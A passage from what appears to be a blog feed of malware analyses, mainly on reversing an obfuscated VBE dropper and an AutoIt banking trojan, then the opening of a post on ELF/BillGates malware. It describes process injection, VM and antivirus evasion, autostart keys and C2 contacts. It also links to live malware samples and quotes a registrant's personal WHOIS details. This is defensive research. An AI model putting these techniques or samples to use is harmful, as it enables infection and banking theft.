variable name you like which that is so \"you\" so you will recognize it instantly. That will help you to recognize the actual malicious logic the malware coder tried to hide it from you. This method is used in most programming language based malicious obfuscation I am working with, I think I've tried and tested it enough, it works in Java(with or without Script)), VB, PHP, Perl or AutoIt malicious obfuscation code that I face for these good three years..and it still works! Even some crooks tried hard to mitigate this method with some silly tricks but that just simply doesn't work, since this is just a simple coding matter. So please remember: \u003Cb\u003E\u003Ci\u003E\"To simplify the code!\"\u003C\/i\u003E\u003C\/b\u003E \u003Cp\u003EIn this case the memo of the above rule and process applied to this sample is as per seen in this pastebin--\u003E [\u003Ca href=\"https:\/\/pastebin.com\/MDSWCv2D\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003E\u003Ci\u003ENoted: I tweaked some code so you won't run it in harmful way if you just copy paste and run it, it will burp the garbled code as per below picture :-)\u003C\/i\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-cEr_sikb-VY\/VeE5UhcttFI\/AAAAAAAAS_c\/sha3iBTQOt0\/s3640-Ic42\/200.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-cEr_sikb-VY\/VeE5UhcttFI\/AAAAAAAAS_c\/sha3iBTQOt0\/s400-Ic42\/200.png\u003E\u003C\/a\u003E \u003Cp\u003EBelow is the explanation of the paste and the next steps:\u003Cbr\u003EThere are two environment that the gods of Windows provide us to deal with visual basic scripting in any machine with \u003Cb\u003E\u003Ci\u003Ewscript.exe\u003C\/i\u003E\u003C\/b\u003E and \u003Ci\u003E\u003Ci\u003Ecscript.exe\u003C\/i\u003E\u003C\/i\u003E, I use wscript.exe only for checking the break point using \u003Cb\u003E\u003Ci\u003EWscript.Echo\u003C\/i\u003E\u003C\/b\u003E command to check the variable result. In the paste you will see some of simple breakpoints to check the vital values of the script. As per seen in the below screenshots:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-1Vuf0INzoBQ\/VeCHobewRrI\/AAAAAAAAS8g\/zzqreUs_h2Y\/s2741-Ic42\/004b.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-1Vuf0INzoBQ\/VeCHobewRrI\/AAAAAAAAS8g\/zzqreUs_h2Y\/s110-Ic42\/004b.png\u003E\u003C\/a\u003E  \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-K44W8rYbk18\/VeCHowjX8hI\/AAAAAAAAS8s\/_tjA3m6c5do\/s2720-Ic42\/005.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-K44W8rYbk18\/VeCHowjX8hI\/AAAAAAAAS8s\/_tjA3m6c5do\/s110-Ic42\/005.png\u003E\u003C\/a\u003E  \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Fa8H2l67BuY\/VeCHpFfLVBI\/AAAAAAAAS8o\/SuBn6HPz5Ug\/s2711-Ic42\/006.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-Fa8H2l67BuY\/VeCHpFfLVBI\/AAAAAAAAS8o\/SuBn6HPz5Ug\/s110-Ic42\/006.png\u003E\u003C\/a\u003E \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-ab2VJl3-Ll8\/VeCHpsrb9AI\/AAAAAAAAS88\/tSnYMLr_AM8\/s2576-Ic42\/007.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-ab2VJl3-Ll8\/VeCHpsrb9AI\/AAAAAAAAS88\/tSnYMLr_AM8\/s110-Ic42\/007.png\u003E\u003C\/a\u003E  \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-dxmYIDx5SFU\/VeCMi8WursI\/AAAAAAAAS-g\/Ph2zHvhDEZY\/s2720-Ic42\/009.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-dxmYIDx5SFU\/VeCMi8WursI\/AAAAAAAAS-g\/Ph2zHvhDEZY\/s110-Ic42\/009.png\u003E \u003C\/a\u003E \u003Cp\u003EAfter the breakpoint's debugging lead you to the correct result you would want to copy paste them to a text, in this point you can run the script with the \u003Cb\u003E\u003Ci\u003Ecscript.exe\u003C\/i\u003E\u003C\/b\u003E to get the text result in the console as per snapshot below: \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-e4Dx1nYoKB8\/VeCHrJm90XI\/AAAAAAAAS-Q\/slJNSObhGvs\/s2512-Ic42\/009c.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-e4Dx1nYoKB8\/VeCHrJm90XI\/AAAAAAAAS-Q\/slJNSObhGvs\/s450-Ic42\/009c.png\u003E\u003C\/a\u003E\u003Cbr\u003EThe full code is beautified as per below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-SBeM-HVIBmo\/VeCHq0VHTVI\/AAAAAAAAS-E\/dTinSe1eChU\/s2720-Ic42\/009b.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-SBeM-HVIBmo\/VeCHq0VHTVI\/AAAAAAAAS-E\/dTinSe1eChU\/s580-Ic42\/009b.png\u003E\u003C\/a\u003E\u003Cbr\u003EPlease noted words \u003Cb\u003E\u003Ci\u003E\"nome correto do exe\"\u003C\/i\u003E\u003C\/b\u003E which means something like \u003Cb\u003E\u003Ci\u003E\"correcting the exe's filename\"\u003C\/i\u003E\u003C\/b\u003E in \u003Ci\u003EPortuguese\u003C\/i\u003E, that was shown in the new malware code script result after the decoding.  \u003Cp\u003EAgain we still have to deal with the visual basic script, but all of the code are readable. It's obviously it downloads the zip file from the internet and save it to a certain folder and extracted into \u003Cb\u003E\u003Ci\u003E%appdata%+random folder\u003C\/i\u003E\u003C\/b\u003E name into random \u003Cb\u003E\u003Ci\u003Efilename +.exe\u003C\/i\u003E\u003C\/b\u003E extension. The script is neat, it has the originally coded \u003Ci\u003Erandomize functions \u003C\/i\u003Eand \u003Ci\u003Eoriginal coded SUBs\u003C\/i\u003E for downloading the remote file from hard coded IP address of \u003Cb\u003E\u003Ci\u003E5.175.145.181\u003C\/i\u003E\u003C\/b\u003E using \u003Ci\u003E\u003Cb\u003Emicrosoft.xmlhttp\u003C\/b\u003E\u003C\/i\u003E and \u003Cb\u003E\u003Ci\u003Eadodb.stream\u003C\/i\u003E\u003C\/b\u003E objects.\u003Cbr\u003ETo be noted, our payload is a zip file contains the text file that can be viewed in Virus Total in here--\u003E[\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/1bbbb8a2f70d275f5f65cd77157f6b6bf3ea913f9b420368f627780527741a2a\/analysis\/1440760429\/\"\u003Elink\u003C\/a\u003E] or can be viewed by the picture below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-CxADUc2nkDM\/VeCHndb6vWI\/AAAAAAAAS8A\/SsmMK6FpZ7w\/s3720-Ic42\/002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-CxADUc2nkDM\/VeCHndb6vWI\/AAAAAAAAS8A\/SsmMK6FpZ7w\/s450-Ic42\/002.png\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ci\u003ENoted: If you analyze a malware please drop the\u003Ci\u003E idea of WYSIWYG (what you see is what you get)\u003C\/i\u003E, because every appearance that you see was meant to fool you. \u003Cbr\u003EExample: this \u003Cb\u003E\u003Ci\u003EText File\u003C\/i\u003E\u003C\/b\u003E.\u003C\/i\u003EIsn't it amazing to see that in this era there is still a crook who want victims to download 6Mb of malware unrecognized? Well, here is one of them..   \u003Cp\u003EThe IP that serves this malware is located in Germany: \u003Cpre class=\"brush: asm\"\u003E  \"ip\": \"5.175.145.181\",\u003Cbr \/\u003E  \"hostname\": \"b9.globalplex.us\",\u003Cbr \/\u003E  \"city\": null,\u003Cbr \/\u003E  \"country\": \"DE\",\u003Cbr \/\u003E  \"loc\": \"51.0000,9.0000\",\u003Cbr \/\u003E  \"org\": \"AS12586 GHOSTnet GmbH\"\u003C\/pre\u003E \u003Cp\u003E\u003Ch2\u003EThe AutoIt PE \"Banco\" banking trojan\u003C\/h2\u003E \u003Cp\u003EA quick check will confirm the badness of this \"text\" file which is actually is a PE:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-8slU0Ro9c5Y\/VeCHn-L4ceI\/AAAAAAAAS9A\/kvU7FlwmiaU\/s3720-Ic42\/003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-8slU0Ro9c5Y\/VeCHn-L4ceI\/AAAAAAAAS9A\/kvU7FlwmiaU\/s580-Ic42\/003.png\u003E\u003C\/a\u003E\u003Cbr\u003EI love to use pyew since the day we start MalwareMustDie and thank's to Mr.Joxean Koret to develop it, I just want him to know that I use it all along for three years non stop :-) along with many shell tools I use. It is VERY useful for the UNIX shell that can not be used to compile full binary to run other binary analysis tools since it runs on python. And it has many useful disassembler functions too. Here's the snip of the payload in this story:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-RKctUojj2X0\/VeCHr4GYmUI\/AAAAAAAAS98\/-iKa4JXKg78\/s2712-Ic42\/009e.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-RKctUojj2X0\/VeCHr4GYmUI\/AAAAAAAAS98\/-iKa4JXKg78\/s580-Ic42\/009e.png\u003E\u003C\/a\u003E \u003Cp\u003EIn order to find the best way to do it, static analysis is a must. The pescanner is assuring many details for the further reversing purpose:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-I0L5f7B1w_g\/VeCHsc1MOaI\/AAAAAAAAS9s\/1sGjHbdERsk\/s3576-Ic42\/101.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-I0L5f7B1w_g\/VeCHsc1MOaI\/AAAAAAAAS9s\/1sGjHbdERsk\/s580-Ic42\/101.png\u003E\u003C\/a\u003E\u003Cbr\u003EJust to make sure it's not an false detection I tend to re-check it with the other beloved tool I use, you all know what it is:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Iw38_KMCLlk\/VeCHsn0dx1I\/AAAAAAAAS-I\/WNw21tZIboI\/s3720-Ic42\/102.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-Iw38_KMCLlk\/VeCHsn0dx1I\/AAAAAAAAS-I\/WNw21tZIboI\/s580-Ic42\/102.png\u003E\u003C\/a\u003E \u003Cp\u003EFor friends with the Wndows OS environment, don't worry! PEStudio can statically analyze this malware very good, take a look of how many indicator was raised an dthe detection of the AutoIt overlay below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-jRM6x5K0uak\/VeCUQPGWYHI\/AAAAAAAAS-4\/9Z9wrhI4wVw\/s4512-Ic42\/105.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-jRM6x5K0uak\/VeCUQPGWYHI\/AAAAAAAAS-4\/9Z9wrhI4wVw\/s512-Ic42\/105.png\u003E\u003C\/a\u003E \u003Cp\u003EOK, to reverse it, since this is the AutoIt malware, I just prefer to decompile it for the analysis. I use this good tool for it --\u003E[\u003Ca href=\"https:\/\/exe2aut.com\/\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003EThe result is as below, it is bringing us to \"another level\" of obfuscation :-) \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-jmSzY4OPlmQ\/VeCHs3WeAOI\/AAAAAAAAS-M\/6RT7fTM649s\/s3720-Ic42\/103.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-jmSzY4OPlmQ\/VeCHs3WeAOI\/AAAAAAAAS-M\/6RT7fTM649s\/s580-Ic42\/103.png\u003E\u003C\/a\u003E \u003Cp\u003EDon't worry. We can go back to our rules above to analyze it properly, with some patience, a good 1 hour and good macro editor you can have a much better view in no time :-) \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-J_l5dY3v-bo\/VeCdqOAI5zI\/AAAAAAAAS_I\/vqwuOFHGpPI\/s3720-Ic42\/104.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-J_l5dY3v-bo\/VeCdqOAI5zI\/AAAAAAAAS_I\/vqwuOFHGpPI\/s580-Ic42\/104.png\u003E\u003C\/a\u003E \u003Cp\u003EYou can see there some DLL struct scripted for the usage malicious calls of and some PE binaries blobs ( which those are there to be used for the x64 or x32 OS \u003Ci\u003Eprocess injection\u003C\/i\u003E). Please try to decode the AutoIt script by yourself and trail its variable one by one. It's good to see a readable code is it?   \u003Cp\u003EI beautified \u0026 cleaned the 186+ of obfuscated variables and functions used in this obfuscated decoded source code, so if you want to snip into the result first without taking effort to decode or cleaning nor beautifying code, you can see it in MMD pastebin to see how the malicious operation calls and self PE injection technique and tricks (like there is a thread injection to modify other thread's contents) that were all done by this AutoIt's codes, the link is here--\u003E[\u003Ca href=\"https:\/\/pastebin.com\/cUfedtgb\"\u003Elink\u003C\/a\u003E].\u003Cbr\u003E\u003Ca name=injection\u003E \u003Cp\u003E\u003Ch2\u003EHow AutoIt can inject memory?\u003C\/h2\u003E\u003C\/a\u003E\u003Cp\u003EIt's a simple way to inject actually, it forms object of DllStruct by the AutoIt programming code, to feed the object with the parameter and hard coded binary data (which are obfuscated) to form several malicious performance, and write it into specific address in the memory. This is the main concept of this AutoIt\/PE malware works to infect the victim. Some of the tricks for allowing that action was formed with the preliminary tricks to bypass security. The variable name is telling you which part of process it is being used actually so it is a bit traceable. Frankly speaking I never thought will face this exploitation-like action when seeing this sample in the beginning. But I will make simple explanation below but not too detail yet, since many parts are still being investigated now.  \u003Cp\u003EIn the pastebin data, for the early injection operation, please watch the value of \u003Cb\u003E$var30\u003C\/b\u003E and \u003Cb\u003E$var120\u003C\/b\u003E which are loaded with binary data to be used to perform the injection for running process. I spot the memory writing operation by script is about as per snipped below;\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-XfJpXN6rHXg\/VeGTdLDgtTI\/AAAAAAAAS_w\/QSFRkSTW7rc\/s2640-Ic42\/400.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-XfJpXN6rHXg\/VeGTdLDgtTI\/AAAAAAAAS_w\/QSFRkSTW7rc\/s580-Ic42\/400.png\u003E\u003C\/a\u003E\u003Cbr\u003EThe above snippet code can show you how the memory injection can be perform by this script. The deeper ROP analysis is actually needed to understand the details of this. When fully run, I can see the PE was written in the memory from the source address 0x410DAD and by the VirtualAllocEx symbol calls of system32.dll on base memory 0xE80000 and with the big size (length) PE file:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-ojtERtE5S5g\/VeGTdBAljUI\/AAAAAAAAS_0\/Tr0w5T0GivU\/s2580-Ic42\/401.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-ojtERtE5S5g\/VeGTdBAljUI\/AAAAAAAAS_0\/Tr0w5T0GivU\/s580-Ic42\/401.png\u003E\u003C\/a\u003E\u003Cbr\u003EAlso, if you have a tool so trace steps of a process in Windows environment, you will see in steps how the sample is forming injection to the foreign address by injecting itself:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-EOfsEqKAyEU\/VeGdHezWInI\/AAAAAAAATAQ\/9pRDMZYboqA\/s2640-Ic42\/403.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-EOfsEqKAyEU\/VeGdHezWInI\/AAAAAAAATAQ\/9pRDMZYboqA\/s580-Ic42\/403.png\u003E\u003C\/a\u003E \u003Cp\u003EJust for fun, I compiled the first bin loaded to inject to understand what it is, the compilation is the PE with value of binary $var30 string (just for curiosity..I know this will end up to nowhere) that was called by DLLStruct snipped above, so the entry point for reverse engineering of that binary can be \"factorized\", you can get the sample in here [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/43fc02c71e4513ed5a38a4d0b583a1c098db51c2f94a8481195892f718c2cfbf\/analysis\/1440847246\/\"\u003Elink\u003C\/a\u003E] for you to analyze it using any disassembler software. You'll see something like this:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-g82nTSo5Rt8\/VeGX3IpKYxI\/AAAAAAAATAA\/18oHPg7b8_s\/s3640-Ic42\/402.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-g82nTSo5Rt8\/VeGX3IpKYxI\/AAAAAAAATAA\/18oHPg7b8_s\/s580-Ic42\/402.png\u003E\u003C\/a\u003E\u003Cbr\u003EWell, the 0x4001e5 doesn't make any sense to me, and this loopbacks to the main entry. lol :-)So we know this maybe not a shellcode.  \u003Cp\u003EAnyway.. please enjoy the further analysis of the calls made from the decoded PE(AutoIt) :-)  \u003Cp\u003E\u003Ch2\u003ESummary of the PE's malicious behavior detected:\u003C\/h2\u003E \u003Cp\u003EInstead the memory inject \u0026 thread modification, the other activity of the PE is: The sleep time taken after executed (see the beautified source code), some of the detection of the VM (access to \u003Cb\u003E\\VBoxMiniRdrDN \/ VBoxHook.dllU \/ VMware\u003C\/b\u003E), it seeks for FWPUCLNT.DLL (windows firewall). Creates \u003Ci\u003Eregistry autostart\u003C\/i\u003E with changes file view  setting of explorer (I don't know what this is for..but there's no good in it) and.. \u003Cpre class=\"brush: asm\"\u003EHKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u003Cbr \/\u003EHKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced EnableBalloonTips\u003Cbr \/\u003EHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{XXX}\\InProcServer32\u003C\/pre\u003EEtc activities for instance: \u003Cpre class=\"brush: asm\"\u003ESelf rename file extension of itself into .exe\u003Cbr \/\u003EBinding to local INET socket to open \u0026 listening port 2038\u003Cbr \/\u003EMutex: \"\\BaseNamedObjects\\2015.0.11\"\u003C\/pre\u003EAnd some strings to mitigate these security products: \u003Cpre class=\"brush: asm\"\u003EAvira\\Antivirus\\avcenter.exe\u003Cbr \/\u003EAvira\\Antivirus\\avgnt.exe\u003Cbr \/\u003E\\procexp.exe\u003C\/pre\u003E  \u003Cp\u003E\u003Ch2\u003EThe callback\u003C\/h2\u003E \u003Cp\u003EThe malware is contacting the remote host as CNC in Brazil with IP \u003Cb\u003E\u003Ci\u003E187.17.111.103\u003C\/i\u003E\u003C\/b\u003E and sending CNC poke data via a \u003Cb\u003E\u003Ci\u003EHTTP\/1.0 POST\u003C\/i\u003E\u003C\/b\u003E, that IP is having a very bad reputation IP--\u003E[\u003Ca href=\"https:\/\/www.virustotal.com\/en\/ip-address\/187.17.111.103\/information\/\"\u003Elink\u003C\/a\u003E]:below is the evidence: \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-glag9tL6iPQ\/VeCHsE0eitI\/AAAAAAAAS9o\/VkysMOeKBq4\/s3720-Ic42\/100.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-glag9tL6iPQ\/VeCHsE0eitI\/AAAAAAAAS9o\/VkysMOeKBq4\/s580-Ic42\/100.png\u003E\u003C\/a\u003E \u003Cp\u003EIt is our team's drill to search the fresh CNC information as much as possible to support the work of law process who would like to follow a crime investigation for the case. So in this case too, I extracted some information, so if I may advice..in minimum please do the same for the cases that you spotted.  \u003Cp\u003ELookup result for the domain called: \u003Cpre class=\"brush: asm\"\u003E;; ANSWER SECTION:\u003Cbr \/\u003Ehostbemore.com.         1800    IN      A       187.17.111.103\u003Cbr \/\u003E\u003Cbr \/\u003E;; AUTHORITY SECTION:\u003Cbr \/\u003Ehostbemore.com.         3600    IN      NS      ns1.dominios.uol.com.br.\u003Cbr \/\u003Ehostbemore.com.         3600    IN      NS      ns2.dominios.uol.com.br.\u003Cbr \/\u003Ehostbemore.com.         3600    IN      NS      ns3.dominios.uol.com.br.\u003Cbr \/\u003E\u003Cbr \/\u003E;; ADDITIONAL SECTION:\u003Cbr \/\u003Ens1.dominios.uol.com.br. 3275   IN      A       200.98.199.199\u003Cbr \/\u003Ens2.dominios.uol.com.br. 3275   IN      A       200.221.65.6\u003Cbr \/\u003Ens3.dominios.uol.com.br. 3275   IN      A       200.98.199.204\u003Cbr \/\u003E\u003C\/pre\u003EIp address origin (GeoIP \u0026 ASN): \u003Cpre class=\"brush: asm\"\u003E  \"ip\": \"187.17.111.103\",\u003Cbr \/\u003E  \"hostname\": \"No Hostname\",\u003Cbr \/\u003E  \"city\": null,\u003Cbr \/\u003E  \"country\": \"BR\",\u003Cbr \/\u003E  \"loc\": \"-23.5477,-46.6358\",\u003Cbr \/\u003E  \"org\": \"AS7162 Universo Online S.A.\"\u003Cbr \/\u003E\u003C\/pre\u003EThe domain is registered with an email contact of \u003Cb\u003EARNALDOBALTAZAR@GMAIL.COM\u003C\/b\u003E to \u003Cb\u003EENOM.COM\u003C\/b\u003E: \u003Cpre class=\"brush: asm\"\u003EDomain Name: HOSTBEMORE.COM\u003Cbr \/\u003ERegistry Domain ID: 1895096489_DOMAIN_COM-VRSN\u003Cbr \/\u003ERegistrar WHOIS Server: whois.enom.com\u003Cbr \/\u003ERegistrar URL: www.enom.com\u003Cbr \/\u003EUpdated Date: 2015-07-07T05:57:31.00Z\u003Cbr \/\u003ECreation Date: 2015-01-10T15:12:00.00Z\u003Cbr \/\u003ERegistrar Registration Expiration Date: 2016-01-10T15:12:00.00Z\u003Cbr \/\u003ERegistrar: ENOM, INC.\u003Cbr \/\u003ERegistrar IANA ID: 48\u003Cbr \/\u003ERegistry Registrant ID:\u003Cbr \/\u003ERegistrant Name: \"ARNALDO BALTAZAR NETO NETO\"\u003Cbr \/\u003ERegistrant Organization: \"SOUZACRUZFERRAGISTA\"\u003Cbr \/\u003ERegistrant Street: \"AV BELA VISTA2\u003Cbr \/\u003ERegistrant City: \"GOIANIA\"\u003Cbr \/\u003ERegistrant State\/Province:\u003Cbr \/\u003ERegistrant Postal Code: \"74938110\"\u003Cbr \/\u003ERegistrant Country: \"BR\"\u003Cbr \/\u003ERegistrant Phone: \"+55.6198515323\"\u003Cbr \/\u003ERegistrant Email: \"ARNALDOBALTAZAR@GMAIL.COM\"\u003C\/pre\u003E \u003Cp\u003E\u003Ch2\u003ESample for analysis learning purpose\u003C\/h2\u003E It's downloadable in a 7zip format from here --\u003E[\u003Ca href=\"http:\/\/www.mediafire.com\/download\/e0af5figuvjbulk\/ContratoAssinar.vbe.7z\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003EThe payload in 7zip format is here --\u003E[\u003Ca href=\"http:\/\/www.mediafire.com\/download\/b1w32nh83eg99w6\/btieste.7z\"\u003Elink\u003C\/a\u003E]  \u003Cp\u003EThe next challenge...encryption VBE: \u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EThis will bring VBE \u003Ca href=\"https:\/\/twitter.com\/hashtag\/malware?src=hash\"\u003E#malware\u003C\/a\u003E infecting script into next level: the encryption\u0026#10;\u003Ca href=\"http:\/\/t.co\/4OYjZsI8Bg\"\u003Ehttp:\/\/t.co\/4OYjZsI8Bg\u003C\/a\u003E\u0026#10;\u003Ca href=\"https:\/\/twitter.com\/hashtag\/MalwareMustDie?src=hash\"\u003E#MalwareMustDie\u003C\/a\u003E \u003Ca href=\"http:\/\/t.co\/oAGqod50vQ\"\u003Epic.twitter.com\/oAGqod50vQ\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/637646516820185089\"\u003EAugust 29, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003EKudos the cool coders of great tools \u0026 OS we use: \u003Cblockquote class=\"twitter-tweet\" lang=\"ja\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EThanks: \u003Ca href=\"https:\/\/twitter.com\/matalaz\"\u003E@matalaz\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/virustotal\"\u003E@virustotal\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/radareorg\"\u003E@radareorg\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/ochsenmeier\"\u003E@ochsenmeier\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/WiresharkNews\"\u003E@WiresharkNews\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/freebsd\"\u003E@freebsd\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/ThePSF\"\u003E@ThePSF\u003C\/a\u003E for 3years helping \u003Ca href=\"https:\/\/twitter.com\/hashtag\/MalwareMustDie?src=hash\"\u003E#MalwareMustDie\u003C\/a\u003E w\/your development!\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/637329545025052672\"\u003E2015, 8月 28\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003EHappy anniversary to MMD friends! Stay safe! #MalwareMustDie!"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/7145794022713030837\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/08\/mmd-0039-2015-learning-about-vbe.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/7145794022713030837"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/7145794022713030837"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/08\/mmd-0039-2015-learning-about-vbe.html","title":"MMD-0040-2015 - Dissecting \u0026 learning about VBE Obfuscation \u0026 AutoIt Banco Trojan"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/lh3.googleusercontent.com\/-UkO-8I85Nkg\/VeCHnVFaGMI\/AAAAAAAAS8Q\/LUnTQznQu54\/s72-c\/000a.png","height":"72","width":"72"},"thr$total":{"$t":"0"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-7127238207952425696"},"published":{"$t":"2015-08-22T06:39:00.000-07:00"},"updated":{"$t":"2015-08-24T17:40:04.219-07:00"},"title":{"type":"text","$t":"MMD-0039-2015 - ChinaZ made new malware: ELF Linux\/BillGates.Lite"},"content":{"type":"html","$t":"\u003Cp\u003E\u003Ch2\u003EBackground\u003C\/h2\u003E \u003Cp\u003EThere are tweets I posted which are related to this topic. Our team spotted the sample a week ago. And this post is the promised details, I am sorry for the delay for limited resource that we have since for a week I focused to help good people in raising awareness for cleaning up PE malware Dyre\/Upatre on router proxies..  \u003Cp\u003EYes. We found a new version of ELF malware, which is originated from \u003Cb\u003ELinux\/BillGates\u003C\/b\u003E codes, this ELF was spotted (thank's to Benkow) on what we suspected as ChinaZ actor's web panel, was detected on offensive action to some linux hosts in internet via \u003Ci\u003ESSH login bruting attack\u003C\/i\u003E (which is not eliminating the possibility of \"other known\" infection methods). The panel is the usual \u003Cb\u003E\u003Ci\u003EHTTP File Server (HFS)\u003C\/i\u003E\u003C\/b\u003E a compact good web server that runs of the windows platform with the limited screenshot below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-m1noC0b84BI\/Vdh4uDrQjkI\/AAAAAAAAS4U\/3xsoawY8Hv4\/s1616-Ic42\/2Untitled.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-m1noC0b84BI\/Vdh4uDrQjkI\/AAAAAAAAS4U\/3xsoawY8Hv4\/s450-Ic42\/2Untitled.png\u003E\u003C\/a\u003E\u003Cbr\u003EHashes:\u003Cbr\u003E62d027a1eb34f642d521b9d11bb52a53\u003Cbr\u003E9a104d1c53573f607f94cd47799b260a \u003Cp\u003EThese are the ix86 \u003Cb\u003E32 bit\u003C\/b\u003E and \u003Cb\u003E64 bit\u003C\/b\u003E compiled malware file from the same source code, with the below binary detail: \u003Cpre class=\"brush: asm\"\u003EChina: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU\/Linux 2.2.5, not stripped\u003Cbr \/\u003EChinaz: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, for GNU\/Linux 2.6.4, not stripped\u003C\/pre\u003E \u003Cp\u003EUnder the analysis of it's resource, we can tell this malware was developed with cropping from the original Linux\/BillGates sources by eliminating some important parts of the \u003Cb\u003ELinux\/BillGates\u003C\/b\u003E like \u003Cb\u003EBilling\u003C\/b\u003E, \u003Cb\u003EGates\u003C\/b\u003E, \u003Cb\u003ESerial\u003C\/b\u003E, \u003Cb\u003ERSA encrypted dropper\u003C\/b\u003E, \u003Cb\u003Einternet packet capturing binary module\u003C\/b\u003E, \u003Cb\u003EDNS amplification\u003C\/b\u003E, and even reducing its known \u003Cb\u003E12 method of flood attacks\u003C\/b\u003E and other minors parts, to be built as a compact version of its descendant to run as backdoor \u0026 serving limited flood attacks after added with several original adjustment and some adoption code from another ELF malware. We 